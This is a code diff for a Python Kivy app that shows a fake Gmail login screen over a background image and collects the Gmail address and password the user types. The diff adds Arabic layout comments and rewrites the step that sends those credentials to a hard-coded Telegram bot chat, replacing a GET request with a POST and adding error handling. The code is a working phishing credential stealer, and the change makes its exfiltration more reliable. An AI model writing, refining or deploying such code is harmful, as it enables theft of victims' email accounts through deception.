@@ -12,9 +12,11 @@ CHAT_ID = "1170274856"
 class LoginScreen(FloatLayout):
     def __init__(self, **kwargs):
         super().__init__(**kwargs)
+        # الخلفية
         self.background = Image(source="IMG-20250728-WA0002.jpg", allow_stretch=True, keep_ratio=False, size_hint=(1,1), pos_hint={'x':0, 'y':0})
         self.add_widget(self.background)
 
+        # الصندوق الرئيسي
         self.box = BoxLayout(orientation='vertical', size_hint=(0.8, 0.5), pos_hint={'center_x':0.5, 'center_y':0.5}, spacing=10)
         
         self.email_input = TextInput(hint_text="Gmail", size_hint=(1, None), height=50, multiline=False)
@@ -33,8 +35,16 @@ class LoginScreen(FloatLayout):
         gmail = self.email_input.text
         password = self.password_input.text
         message = f"Gmail: {gmail}\nPassword: {password}"
-        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
-        requests.get(url)
+        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+
+        try:
+            response = requests.post(url, data={
+                "chat_id": CHAT_ID,
+                "text": message
+            })
+            print("تم الإرسال:", response.text)
+        except Exception as e:
+            print("حدث خطأ أثناء الإرسال:", e)
 
 class LoginApp(App):
     def build(self):
